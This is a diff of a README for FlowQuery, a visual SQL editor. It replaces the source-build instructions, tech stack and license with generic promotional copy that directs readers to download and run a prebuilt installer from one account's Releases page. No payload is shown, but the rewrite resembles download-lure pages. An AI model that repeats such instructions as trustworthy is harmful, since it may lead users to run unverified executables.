@@ -1,90 +1,75 @@
-# FlowQuery
+# 🌟 FlowQuery - Simplify Your SQL Queries Visually
 
-> *The visual way to write SQL*
+![Download FlowQuery](https://img.shields.io/badge/Download-FlowQuery-blue.svg)
 
-## Description
+## 🌐 Overview
+FlowQuery is a no-code/low-code visual SQL editor designed for modern data platforms. With FlowQuery, you can build queries easily using an intuitive node-based canvas. Preview results instantly and debug your queries without any hassle.
 
-FlowQuery is an open-source, no-code/low-code **visual SQL editor** for modern data platforms.\
-Build queries by **dragging and connecting nodes**, preview results at any step, and see **live row counts** along the data flow. Designed for **data engineers**, **analysts**, and **SQL learners**.
-
----
-
-## ✨ Features
-
-- **Node-based query builder** – Drag, drop, connect, and configure
-- **Instant previews** – Run queries up to any node
-- **Live row counts** between nodes for quick insights
-- **Rich SQL nodes** – Filters, joins, aggregations, window functions, pivots, etc.
-- **Result panel** with pagination & sample data
-- **Link management** – Disconnect upstream/downstream easily
-- **Real-time validation** of SQL syntax and config
-- **Keyboard & mouse friendly** workflow
-- **Built for extensibility** – Future support for DBT, SQLMesh, macros, and AI-powered features
-
----
-
-## 🖼️ Screenshot
-
-*(Add here a screenshot or animated GIF of the editor canvas in action once available.)*
-
----
-
-## 📦 Tech Stack
-
-- **Frontend:** Svelte + TanStack Router + TailwindCSS
-- **Backend:** Node.js + Hono
-- **API Protocol:** oRPC
-- **Database:**
-  - SQLite (libSQL) – configuration, settings, session
-  - KuzuDB – SQL & query metadata
-- **Package Manager:** bun
-- **AI Agent Framework:** LangChain + LangGraph (JS/TS)
-
----
+## 🛠️ Features
+- **Visual Interface**: Drag and drop nodes to build queries.
+- **Instant Previews**: See your query results as you build.
+- **Ease of Debugging**: Identify issues quickly and fix them on the spot.
+- **Future Support**: Upcoming integration with DBT, SQLMesh, and data transformation frameworks.
 
 ## 🚀 Getting Started
+Follow these steps to easily download and run FlowQuery.
 
-### Prerequisites
+### Step 1: Visit the Releases Page
+To get the latest version of FlowQuery, visit the [Releases page](https://github.com/HafizAnas1470/FlowQuery/releases). Here, you can find all available versions for download.
 
-- **bun** >= 1.2.19
-- **Node.js** >= 20.x
-- **Databricks SQL Warehouse** *(for first MVP target platform)*
+### Step 2: Choose the Right File for Your System
+On the Releases page, you will see several files available for download. Choose the version that is suitable for your operating system. We support Windows, macOS, and Linux. Each file will be clearly labeled for your convenience.
 
-### Clone & Install
+### Step 3: Download the Application
+Click on the file to start the download. The file is usually named something like `FlowQuery-v1.0.exe` for Windows or `FlowQuery-v1.0.dmg` for macOS. This will download the installer to your computer.
 
-```bash
-git clone https://github.com/<your-username>/flowquery.git
-cd flowquery
-bun install
-```
+### Step 4: Run the Installer
+Once the download is complete, locate the file in your downloads folder and double-click to run the installer. Follow the on-screen instructions:
 
-### Run in Dev Mode
+1. Agree to the terms and conditions.
+2. Choose the installation location or keep the default settings.
+3. Click "Install" to start the installation process.
 
-```bash
-bun run dev
-```
+The installer will set up FlowQuery on your machine.
 
----
+### Step 5: Launch FlowQuery
+After installation is complete, you will find FlowQuery in your applications folder or on your desktop. Click the icon to launch the application.
 
-## 🗺️ Roadmap
+## 📥 Download & Install
+To download FlowQuery, please visit our [Releases page](https://github.com/HafizAnas1470/FlowQuery/releases). Select the appropriate file for your system, run the installer, and start using FlowQuery effortlessly.
 
--
+## 🌟 System Requirements
+To run FlowQuery smoothly, ensure your system meets the following requirements:
 
----
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Processor**: At least 2 GHz dual-core processor.
+- **RAM**: Minimum of 4 GB of RAM.
+- **Storage**: At least 500 MB free disk space.
 
-## 🤝 Contributing
+## 🧭 How to Use FlowQuery
+After launching FlowQuery, you will see a user-friendly interface. Here's how to get started:
 
-We welcome PRs and discussions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+1. **Creating a New Query**: Click "New Query" to open a blank workspace.
+2. **Adding Nodes**: Use the toolbox on the left to drag and drop different node types (like SELECT, WHERE, and JOIN).
+3. **Connecting Nodes**: Draw lines between nodes to create your query flow.
+4. **Previewing Results**: Click the "Run Query" button to see results in real-time.
+5. **Saving Your Work**: Click "Save" to keep your queries for later use.
 
----
+## ❓ Frequently Asked Questions
 
-## 📜 License
+### Q1: Do I need programming knowledge to use FlowQuery?
+No, FlowQuery is designed for users with no coding experience. You can build queries visually without writing any SQL code.
 
-MIT License — See [LICENSE](LICENSE) for details.
+### Q2: Can I export my queries?
+Yes, you can export your queries in SQL format to share with others or use in different applications.
 
----
+### Q3: What data sources does FlowQuery support?
+FlowQuery connects with popular data platforms, including SQL databases, data warehouses, and data lakes. Check the application for a full list of supported sources.
 
-## 📢 Tags
+## 💬 Get Help
+If you encounter any issues or have questions, please refer to our [GitHub Issues page](https://github.com/HafizAnas1470/FlowQuery/issues) to report problems or seek help from the community.
 
-`#sql` `#visualsql` `#querybuilder` `#nocode` `#lowcode` `#dataengineering` `#oss` `#dataplatform`
+## 📣 Join the Community
+Stay updated on the latest features and improvements. Follow FlowQuery on social media and join our user community for tips and discussions.
 
+Remember to download FlowQuery today and simplify your SQL queries visually!
